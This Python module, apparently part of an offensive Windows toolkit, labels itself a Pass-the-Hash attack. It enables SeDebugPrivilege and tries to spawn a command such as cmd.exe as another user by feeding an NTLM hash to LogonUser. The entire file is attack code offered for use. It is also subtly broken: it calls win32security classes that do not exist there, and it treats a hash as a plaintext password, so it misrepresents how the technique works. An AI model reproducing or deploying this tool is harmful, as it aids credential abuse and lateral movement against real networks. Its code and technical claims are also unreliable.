# utils/winapi/pth.py

import ctypes
import win32security
import ntsecuritycon

# Constants
SE_PRIVILEGE_ENABLED = 0x00000002
SE_DEBUG_NAME = "SeDebugPrivilege"

def enable_debug_privilege():
    """Enable the SeDebugPrivilege for the current process."""
    token_handle = win32security.OpenProcessToken(
        ctypes.windll.kernel32.GetCurrentProcess(),
        ntsecuritycon.TOKEN_ADJUST_PRIVILEGES | ntsecuritycon.TOKEN_QUERY
    )
    privilege_id = win32security.LookupPrivilegeValue(None, SE_DEBUG_NAME)
    new_privileges = [(privilege_id, SE_PRIVILEGE_ENABLED)]
    win32security.AdjustTokenPrivileges(token_handle, False, new_privileges)

def create_process_with_hash(username, domain, ntlm_hash, command):
    """Create a process using the NTLM hash of the specified user."""
    enable_debug_privilege()

    logon_info = win32security.LOGON_INFO()
    logon_info.User = username
    logon_info.Domain = domain
    logon_info.Password = ntlm_hash
    logon_info.LogonType = win32security.LOGON32_LOGON_INTERACTIVE
    logon_info.LogonProvider = win32security.LOGON32_PROVIDER_WINNT50

    try:
        token_handle = win32security.LogonUser(
            logon_info.User,
            logon_info.Domain,
            logon_info.Password,
            logon_info.LogonType,
            logon_info.LogonProvider
        )
        if not token_handle:
            raise ctypes.WinError(ctypes.get_last_error())

        startupinfo = win32security.STARTUPINFO()
        process_information = win32security.PROCESS_INFORMATION()

        success = ctypes.windll.advapi32.CreateProcessAsUserW(
            token_handle,
            None,
            command,
            None,
            None,
            False,
            0,
            None,
            None,
            ctypes.byref(startupinfo),
            ctypes.byref(process_information)
        )
        if not success:
            raise ctypes.WinError(ctypes.get_last_error())

        return f"Process created with PID {process_information.dwProcessId}"
    finally:
        win32security.CloseHandle(token_handle)

def pth(username, ntlm_hash, domain='', command='cmd.exe'):
    """Perform Pass-the-Hash attack and run a command."""
    return create_process_with_hash(username, domain, ntlm_hash, command)
